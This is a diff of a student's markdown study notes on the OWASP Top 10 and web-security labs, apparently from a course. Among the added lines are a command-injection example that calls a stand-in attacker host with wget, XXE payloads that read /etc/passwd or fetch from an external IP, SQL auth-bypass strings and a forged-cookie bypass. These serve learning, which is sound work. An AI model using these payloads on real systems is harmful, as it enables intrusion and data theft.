@@ -1096,6 +1096,8 @@ Here's how zaproxy describes xss:
 
 # day 5: OWASP top10: Injections, Broken Auth, Improper Sessions Management & Sensitive Data Exposure
 
+[this is a good brief on owasp top10](https://www.cloudflare.com/learning/security/threats/owasp-top-10/) and this describes things in so much more [detail](https://www.troyhunt.com/owasp-top-10-for-net-developers-part-1/)
+
 why the same kinda vulnerabilities persist despite all the patches: 
 - basically the dev's profile
 - most webdev courses ignore the security aspects
@@ -1106,6 +1108,12 @@ why the same kinda vulnerabilities persist despite all the patches:
 ## A1: Injection Attacks
 
 aim: security triangle of confidentiality, integrity, and availability to be completely compromised.
+
+
+[brief on command injection](https://gracefulsecurity.com/command-injection-the-good-the-bad-and-the-blind/): 
+  * in blind situations, we can chain commands like sleep that will help us guess whether the app is vulnerable to command injection
+  * out of bands command injection: when the commands run on a separate thread and you can't use cmds like `sleep` to determing if it's vulnerable or not. For this, can do something like: `http://ci.example.org/blind.php?address=127.0.0.1 && wget http://attacker.example.net/?attacksuccessful` where  the wget command online requests the server download a web page. Therefore the attacker could see that the payload worked successfully as their logs would show a GET request to the file: `/?attacksuccessful`
+
 
 [understanding url parameters](https://www.urlencoder.io/learn/) 
   - special and reserved chars shall be [encoded either in hexadec, following the `%` sign](https://secure.n-able.com/webhelp/NC_9-1-0_SO_en/Content/SA_docs/API_Level_Integration/API_Integration_URLEncoding.html) 
@@ -1121,7 +1129,8 @@ aim: security triangle of confidentiality, integrity, and availability to be com
   - blind sql injection
     - boolean based
     - time based 
-  - out of bound sql injection
+  - out of band sql injection
+
 
 - a overview and a [walkthrough on it](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/)
   * identifying whether SQL vulnerability exists: 
@@ -1146,6 +1155,8 @@ aim: security triangle of confidentiality, integrity, and availability to be com
       ```
 
 
+**nb:** sanitising and validating data are two different things: sanitation: removing suspicious parts of the data, validation: rejecting suspicious data
+
 ### week5 lab: SQLi bypassing auth, Free Article Submission
 
 - the [free article submission exploit](https://www.exploit-db.com/exploits/35492)
@@ -1156,7 +1167,7 @@ aim: security triangle of confidentiality, integrity, and availability to be com
 - just reading the report on exploit db for the way to breach it. 
 - this required both the user and pwd fields to have the same payload, I don't really understand how it works though. QQ: how does this payload work :(
 
-### SQL Injection
+### week 5 lab: SQL Injection
 cid=1901
 **the first part is to inject into a login form to bypass auth** 
 - the payload is: `' or '1'='1`
@@ -1182,6 +1193,15 @@ cid=1901
 - here, to accurately determine the HTTP method, just use a proxy, e.g. burpsuite to modify the request and inject directly into the HTTP packet
 
 QQ: why didn't it work when the comment char `--` was used???
+ans: check discord, the answer is there somewhere
+
+* more on injection attacks: 
+    - https://www.cloudflare.com/learning/security/threats/owasp-top-10/
+    - https://www.troyhunt.com/owasp-top-10-for-net-developers-part-1/
+    - [some php object injection cheat sheet, but i don't understand the php code :(](https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/)
+
+
+
 
 ## A2: broken auth
 
@@ -1206,7 +1226,24 @@ cid=438
 - setting up burpsuite on our own computer, need to control proxy settings, don't fully understand everything yet actually.
 - the [exploit](https://www.exploit-db.com/exploits/39167) involves adding the following cookie: `Cookie: LoggedIn=yes` to the request for admin control panel and this cookie-based Authentication meant we just need the correct cookie.
 
-### Improper Session Management – Manipulate URL parameter
+* [examples of broken auth](https://hdivsecurity.com/owasp-broken-authentication)
+
+* [authentication vs authorisation](https://auth0.com/docs/authorization/concepts/authz-and-authn): 
+    * tokens used: authentication would use an id token and authorisation would use an access token
+    * Authentication invovles challenging the user to validate creds while authorisation involves verifying if policies allow the user to access the resource.
+    * In short, access to a resource is protected by both authentication and authorization. If you can't prove your identity, you won't be allowed into a resource. And even if you can prove your identity, if you are not authorized for that resource, you will still be denied access.
+
+
+
+
+
+
+
+
+
+### Week 5 lab: Improper Session Management – Manipulate URL parameter
+e
+
 refer: https://youtu.be/Yt-5Fgg-u_4
 https://www.attackdefense.com/challengedetails?cid=1899
 
@@ -1234,13 +1271,58 @@ always visit the robots.txt and see what's disallowed to the robots
 
 ## A3: sensitive data exposure
 
-- in general: just don't store sensitive info on the client side
+- ***moral of the story: just don't store sensitive info on the client side***
+- [brief](https://deepsource.io/blog/owasp-top-ten-sensitive-data-exposure/) and [another brief](https://www.sitelock.com/blog/owasp-top-10-sensitive-data-exposure/)
+
+- data exposure can happen when info is cached in vulnerable locations. [***Session Storage vs Local Storage vs Cookie***](https://dev.to/bogicevic7/session-storage-vs-local-storage-vs-cookie-elc) and here's [another description](https://bit.ly/37HvGm6) on it: 
+  * session storage: *5MB limit*
+      * is client-side only, no data transfer to the server
+      * each tab/window will create sessionStorage, deleted when closed
+  * local storage: *5MB limit*
+      * the nature of the storage is similar to sessions storage, except this has no expiration date!
+      * it's plaintext, hence insecure. Also means that it has to be serialised
+  * cookie: *4KB limit*
+      * data + expiration date
+      * is passed to the server, can be r/w by both client and server.
+      * if it's a `HttpOnly` cookie, then client-side scripts can't access that cookie
 
 ***ENCODING =/= ENCRYPTION.***
 - encoding is more for the sake of some bijective mapping for the sake of standardising the chars used and prevents the use of special chars 
   - e.g. urls have reserved char % and such...
 
-how to figure out
+* [encoding vs encryption vs hashing](https://medium.com/@tittylouis/encoding-vs-encryption-vs-hashing-f1ad7866c4de): 
+   * Encoding is the process of converting data from one form to another so that it can be properly consumed by a different type of system. it does not require any sort of KEY to perform the process.
+   * Encryption is also a process of transforming data from one form to another. But the primary objective or goal is to keep the information secret. 
+   * Hashing’s primary goal is to ensure the integrity of the data. Which means it would be easy to detect whether somebody has altered the contents of the data.  It should not be possible to go from the output to the input. That means like encoding or encryption you cannot convert the hash data back to original value
+
+* [Analysing Hashes](https://www.tunnelsup.com/hash-analyzer/) 
+    - charset is usually base64 or hexadecimal
+    - `$` delimits the salt and the hash
+
+* [credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing): 
+  - a subset of brute force attacks, involves automated web injection
+  - usually, the credentials are sourced from pwd dump sites or via website breaches. 
+
+
+* ***How to tell if a string is encoded or encrypted?***
+* [Hash Identification](https://null-byte.wonderhowto.com/how-to/use-hash-identifier-determine-hash-types-for-password-cracking-0200447/)
+
+
+* looking at the robots.txt is a good idea since it will tell you what the dev doesn't want crawlers to see, and you might wanna see if those resources/paths are somehow left open. More on [documentation on robots.txt](https://developers.google.com/search/reference/robots_txt
+), take note the caching duraion and how google's crawlers respond to the various status codes.
+  * [robots.txt is becoming an internet protocol soon](https://tools.ietf.org/html/draft-koster-rep-00)
+
+
+* sensitive data exposure: 
+    * https://deepsource.io/blog/owasp-top-ten-sensitive-data-exposure/
+    * https://www.sitelock.com/blog/owasp-top-10-sensitive-data-exposure/
+
+
+    * https://dev.to/bogicevic7/session-storage-vs-local-storage-vs-cookie-elc
+    * https://scotch.io/@PratyushB/local-storage-vs-session-storage-vs-cookie#:~:text=Are%20you%20always%20confused%20between%20session%20storage%2C%20local%20storage%20and%20cookies%3F&text=The%20sessionStorage%20object%20stores%20data,(or%20tab)%20is%20closed.&text=Storage%20limit%20is%20larger%20than%20a%20cookie%20(at%20least%205MB).
+
+    * https://developers.google.com/search/reference/robots_txt
+
 
 ### week5: SQL information available from Web Server Logs, real world webapp
 cid=11
@@ -1255,11 +1337,123 @@ they didn't restrict the db logs, can access it by going to the endpoint:
 
 
 
+# Day 6: OWASP top 10: XXE, Broken Access Control, 
 
+## A4 XXE: XML external entity injection
+* [**a guide to XML** ](https://portswigger.net/web-security/xxe/xml-entities)
+  * DTDs (document type def): define the structureof the XML document, can be either self-contained, external or a hybrid. [about DTDs](https://xmlwriter.net/xml_guide/doctype_declaration.shtml), note that the DTD defines the constraints on the structure of the XML document
+  * structure of XML includes: 
+    - doc's element types 
+    - children element types
+    - order and number of each element type
+    - attributes
+    - entities
+    - notations 
+    - processing instructions
+  * The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded, e.g.
+    * `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>` 
+    * or can use the `file://` protocol: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]> `
+   * Example of external private DTD:
+
+            <!DOCTYPE data [<!ENTITY passwd SYSTEM "file:///etc/passwd">]> <data><text>&passwd;</text></data>
+
+            <!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.81.46.2:9000/passwd">]> <data><text>&passwd;</text></data>
+           
+  
+* [**brief by portswigger**](https://portswigger.net/web-security/xxe#:~:text=Some%20applications%20receive%20client%2Dsubmitted,by%20the%20backend%20SOAP%20service.)
+
+* "External Entity" refers to a storage unit (e.g. a hard drive). 
+XXE attacks can be prevented by just using JSON instead (JSON is less complex)
+
+***There are various Types of XXE attacks.***
+ *[SSRF attacks](https://portswigger.net/web-security/ssrf) where where an external entity is defined based on a URL to a back-end system. . server-side application is induced to make HTTP requests to any URL that the server can access and it exploits trust relationships.
+ * exfitrate data *out-of-band*:  
+ * Retrieve data by triggerring error messages when parsing XXE
+ * Retrieve files in the apllication's response. This uses the `file://<absolute URI>` protocol.
+ * XXE attacks via file upload: 
+    * via image upload: e.g. if the validation happens after the uploading feature, and the protocols include `SVG`(which uses XML), then we can submit a malicious SVG image to reach this hidden attack surface.
+
+* more on handling [blind xxe](https://portswigger.net/web-security/xxe/blind)
+
+
+* [useful reading on architectural sytles for APIs: SOAP, REST and RPC](https://medium.com/api-university/architectural-styles-for-apis-soap-rest-and-rpc-9f040aa270fa#:~:text=In%20general%2C%20an%20architectural%20style,%2Dscale%2C%20predefined%20solution%20structure.&text=The%20REST%20style%20(Representational%20State,the%20SOAP%20style%20and%20GraphQL): 
+  * info about [GraphQL](https://api-university.com/api-lifecycle/api-design/graphql/):
+    - database agnostic, gives more control over the API consumer to describe data needs
+    - has two languages: a declarative, typed query language for APIs and a schema language
+    - allows clients to do both reading and writing of data
+  * [REST api](https://api-university.com/api-lifecycle/api-design/rest/):
+    - makes optimal use of HTTP, constraints are due to contraints in HTTP
+    - mostly perform CRUD actions on data
+  * RPC (Remote Procedure Call) style e.g. JSON-RPC, XML-RPC
+
+
+
+## A5 Broken Acess Control
+
+[Brief on Broken Acess Control](https://www.packetlabs.net/broken-access-control/): 
+* vulnerability: when users can act outside of their intended permissions. It's more of a stepping stone in your pipeline of attacks you wanna do
+  * deals with these services:   implementing authentication into web applications such as password security, account recovery controls, password reset controls, account permissions, and session management. 
+* ***Horizontal Access Control***: from users of same privilege level
+* ***Vertical Access Control***: from users of different (higher) privilege levels 
+* Access control issues are typically not detectable by dynamic vulnerability scanning and static source-code review tools as they require understanding of how certain pieces of data are used within the web app. Manual testing is the best way to detect missing or broken *access controls.
+*
+* Risk: *generally impacts the confidentiality and integrity of data*
+
+
+
+* [**Federated Identities: openid, saml, oauth:**](https://www.softwaresecured.com/federated-identities-openid-vs-saml-vs-oauth/)
+  - using a service to help with identity management, based on a trust relationship with that identity management system. Solves the problem of "how to bring together user login information across many applications and platforms to simplify sign-on and increase security".
 
 # current lab list
 - [error based sql injection](https://www.attackdefense.com/challengedetails?cid=1903)
 - [blind time sql injection](https://www.attackdefense.com/challengedetails?cid=1902)
+
+
+Lesson 5
+Union Based SQL Injection https://www.attackdefense.com/challengedetails?cid=1902
+Error Based SQL Injection https://www.attackdefense.com/challengedetails?cid=1903
+Blind Boolean Based SQL Injection https://www.attackdefense.com/challengedetails?cid=1904
+Blind Time Based SQL Injection https://www.attackdefense.com/challengedetails?cid=1905
+
+
+week 6 labs to do: 
+
+XML External Entity – alter DTD
+https://www.attackdefense.com/challengedetails?cid=1889
+https://youtu.be/EYHrwOageNY
+
+XML External Entity – CVE: Apache Solr  -alter xml file
+https://www.attackdefense.com/challengedetails?cid=1853
+Refer discord channel for corrected payload. Error with lab manual.
+
+XML External Entity – CVE: Apache Solr  
+https://www.attackdefense.com/challengedetails?cid=1530
+
+Insecure Object Direct Reference – Change email and password using existing user session
+https://www.attackdefense.com/challengedetails?cid=1907
+https://youtu.be/LF5DV_g7QBE
+
+Insecure Object Direct Reference II – Changing ticket price
+https://www.attackdefense.com/challengedetails?cid=1899
+https://youtu.be/K20DBHufewQ
+
+Local file inclusion – change filename
+https://www.attackdefense.com/challengedetails?cid=1899
+https://youtu.be/IRZ1KKIMffo
+
+Local file inclusion & Directory traversal - bloofoxCMS
+https://www.attackdefense.com/challengedetails?cid=279
+
+Local file inclusion & Directory traversal - bloofoxCMS
+https://www.attackdefense.com/challengedetails?cid=277
+
+Directory Traversal
+https://www.attackdefense.com/challengedetails?cid=1899
+https://youtu.be/Sx26dpb7G6c
+
+lesson 7: 
+
+
 
 # less important labs to do soon: 
 - [webtoshell](https://www.attackdefense.com/challengedetails?cid=883)
@@ -1267,10 +1461,57 @@ they didn't restrict the db logs, can access it by going to the endpoint:
 - burp login form attack and http attack
 
 # todos and toreads
-* [deception](https://www.helpnetsecurity.com/2018/12/06/introduction-deception-technology/) technology and [honeypots](https://roi4cio.com/en/categories/category/deception-techniques-and-honeypots/)
 
-* [using default credential config](https://thor-sec.com/cheatsheet/shodan/shodan_cheat_sheet/)
-* [more on browser plugin and extensions](https://www.securityweek.com/websites-can-exploit-browser-extensions-steal-user-data)
+start ========
+
+
+random readings: 
+
+* [deception](https://www.helpnetsecurity.com/2018/12/06/introduction-deception-technology/) technology and [honeypots](https://roi4cio.com/en/categories/category/deception-techniques-and-honeypots/)
+   - this is actually really cool. Some forefront-of-cybersec kind of thing
+
+* [using default credential config can be really problematic because shodan is really useful in searching for stuff!](https://thor-sec.com/cheatsheet/shodan/shodan_cheat_sheet/)
+
+* [browser plugin and extensions](https://www.securityweek.com/websites-can-exploit-browser-extensions-steal-user-data) they are shady and shouldn't be trusted like that. The standards that extensions have to follow is more lax than those of websites themselves, hence extensions are very exploitative.
+
+* [devsecops: not exactly devops and with security in mind](https://www.sumologic.com/insight/devsecops-rugged-devops/#:~:text=DevSecOps%20involves%20creating%20a%20'Security,processes%20within%20an%20agile%20framework)
+
+
+
+
+
+
+
+===============   BREAK TIME   ==========
+
+* XXE:
+
+    * https://gracefulsecurity.com/xxe-xml-external-entity-injection/
+    * https://portswigger.net/web-security/xxe#:~:text=Some%20applications%20receive%20client%2Dsubmitted,by%20the%20backend%20SOAP%20service.
+    * more on xml dtd (doctype declaration): https://xmlwriter.net/xml_guide/doctype_declaration.shtml
+            * Example of external private DTD:
+
+            <!DOCTYPE data [<!ENTITY passwd SYSTEM "file:///etc/passwd">]> <data><text>&passwd;</text></data>
+
+            <!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.81.46.2:9000/passwd">]> <data><text>&passwd;</text></data>
+           
+  
+
+
+* broken access control: https://www.packetlabs.net/broken-access-control/
+      * SAML: https://www.softwaresecured.com/federated-identities-openid-vs-saml-vs-oauth/
+
+
+* communication architecture for remote procedures/services:  https://medium.com/api-university/architectural-styles-for-apis-soap-rest-and-rpc-9f040aa270fa#:~:text=In%20general%2C%20an%20architectural%20style,%2Dscale%2C%20predefined%20solution%20structure.&text=The%20REST%20style%20(Representational%20State,the%20SOAP%20style%20and%20GraphQL.
+
+* [SAST vs DAST](https://www.kiuwan.com/blog/application-security-tools-comparison/): 
+  - these areapp security testing tools, mainly differ by how the testing is done
+
+
+
+end ================ 
+
+
 
 * [CRLF characters](https://tools.ietf.org/html/rfc2616)
 * [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
@@ -1296,4 +1537,11 @@ they didn't restrict the db logs, can access it by going to the endpoint:
   * [red team tutorials, has nice cheatsheets and other tutorials on loads of pentesting tools](https://redteamtutorials.com/)
   * [netcat cheatsheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
   * [sql cheatsheet](https://devhints.io/mysql)
+* [somewhat detailed description of owasp top10](https://www.troyhunt.com/owasp-top-10-for-net-developers-part-1/)
+* [hash analyser:](https://www.tunnelsup.com/hash-analyzer/) figure out what kind of hashing is being done. Here are some [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+* Portswigger is a damn good learning and news resource 
 
+
+# Questions: 
+
+1. when doing brute force attacks, how to bypass rate limits? won't the attacker's ip just be blocked? 
